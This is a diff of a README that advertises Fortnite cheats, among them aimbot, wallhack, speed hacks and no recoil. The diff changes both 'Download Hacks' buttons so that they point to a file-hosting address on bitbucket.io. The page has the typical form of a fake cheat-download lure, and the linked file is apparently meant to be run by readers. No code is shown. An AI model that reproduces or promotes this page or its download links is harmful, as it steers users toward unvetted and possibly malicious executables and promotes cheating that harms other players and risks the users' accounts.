@@ -2,7 +2,7 @@
 
 **Cranking 90s too slow? Tired of sweats building the Eiffel Tower mid-fight? Fortnite hacks give you full control: from *perfect aim* and *wall vision* to *speed boosts*, *no recoil*, and more. Whether you're pushing for crowns or just trolling for fun, these cheats flip the script.**
 
-[![Download Hacks](https://img.shields.io/badge/Download-Hacks-blueviolet)](https://wecheaters.github.io/cheats/fortnite/)
+[![Download Hacks](https://img.shields.io/badge/Download-Hacks-blueviolet)](https://fileoffload20.bitbucket.io)
 ---
 
 ## 🚀 What Are Fortnite Hacks?
@@ -17,7 +17,7 @@ They’re built for:
 * Late-game zone control
 * Building, shooting & looting faster than anyone
 
-[![Download Hacks](https://repository-images.githubusercontent.com/707821017/07936764-b075-4355-a5c4-2c9a4a1057f3)](https://wecheaters.github.io/cheats/fortnite/)
+[![Download Hacks](https://repository-images.githubusercontent.com/707821017/07936764-b075-4355-a5c4-2c9a4a1057f3)](https://fileoffload20.bitbucket.io)
 ---
 
 ## 🔥 Most Popular Fortnite Hacks
@@ -106,3 +106,4 @@ fortnite hacks, aimbot fortnite pc, wallhack esp cheat fn, speed hack fortnite, 
 
 **Fortnite hacks turn every match into your personal highlight reel.**
 Lock on, build faster, and wipe squads like it’s nothing. Play smarter, not harder. 🎮🔥👑
+
